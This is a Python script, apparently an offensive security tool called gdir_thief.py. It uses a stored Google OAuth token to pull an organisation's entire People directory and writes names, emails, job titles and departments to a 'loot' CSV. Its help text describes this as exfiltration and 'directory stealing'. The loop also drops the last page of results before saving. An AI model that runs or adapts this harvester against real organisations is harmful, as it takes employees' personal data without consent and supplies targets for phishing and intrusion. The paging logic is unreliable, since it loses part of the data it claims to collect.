import os.path
import getopt
import sys
import time
import csv
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials

SCOPES = ['https://www.googleapis.com/auth/directory.readonly']

### Builds the G-Drive API service
def build_service():
    creds = None

    if os.path.exists('./credentials/token.json'):
        creds = Credentials.from_authorized_user_file('./credentials/token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                './credentials/credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('./credentials/token.json', 'w') as token:
            token.write(creds.to_json())

    service = build('people', 'v1', credentials=creds)
    return service


def get_dir(service):
    full_directory = []
    print('[*] Fetching the Organization\'s Google People Directory.  This could take a while...')
    page_token = None

    while True:
        results = service.people().listDirectoryPeople(
            sources='DIRECTORY_SOURCE_TYPE_DOMAIN_PROFILE',
            readMask='emailAddresses,organizations',
            pageSize=1000,
            pageToken=page_token).execute()

        try:
            directory = results.get('people', [])
            time.sleep(1)
        except Exception as e:
            print('[*] An Error occured fetching the directory: %s' % str(e))
            sys.exit(2)

        try:
            page_token = results.get('nextPageToken', None)
        except Exception as e:
            print('[*] An Error occured fetching the next pagination token: %s' % str(e))

        if page_token is None:
            break


        if not directory:
            print('[*] No directory found.')
            exit(2)
        else:
            full_directory.append(directory)


    return full_directory

def print_csv(full_directory):
    print('[*] Writing Directory to CSV')
    file = open('./loot/directory.csv', 'w')
    file.write("First Name, Last Name, Email, Position, Orgnanization\n")
    for directory in full_directory:
        for person in directory:
            firstname = ""
            lastname = ""
            email = ""
            orgname = ""
            jobtitle = ""

            emails = person.get('emailAddresses', [])
            orgs = person.get('organizations', [])


            if emails:
                email = emails[0].get('value')

            fullname = email.split('@', 1)[0]
            if '.' in fullname:
                firstname, lastname = fullname.strip().split('.', 1)


            firstname = firstname.replace(",", "-")
            firstname = firstname.capitalize()

            lastname = lastname.replace(",", "-")
            lastname = lastname.capitalize()

            if orgs:
                orgname = str(orgs[0].get('name'))
                orgname = orgname.replace(",", "-")

                if orgname == 'None':
                    orgname = ''

                jobtitle = str(orgs[0].get('title'))
                jobtitle = jobtitle.replace(",", "-")
                if jobtitle == 'None':
                    jobtitle = ''

            file.write(firstname + "," + lastname + "," + email + "," +
                jobtitle + "," + orgname + "\n")

    file.close()


def main():
    # usage
    usage = '\nusage: python3 gdir_thief.py [-h]\n'
    #help
    help = '\nThis Module will connect to Google\'s People API using an access token and '
    help += 'exfiltrate the organization\'s\nPeople directory.  It will output a CSV '
    help += 'file to ./loot/directory.csv\n'

    try :
        opts, args = getopt.getopt(sys.argv[1:], "h", ["help"])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()

    service = build_service()
    directory = get_dir(service)
    print_csv(directory)
    print('[*] Directory stealing complete')

if __name__ == '__main__':
    main()
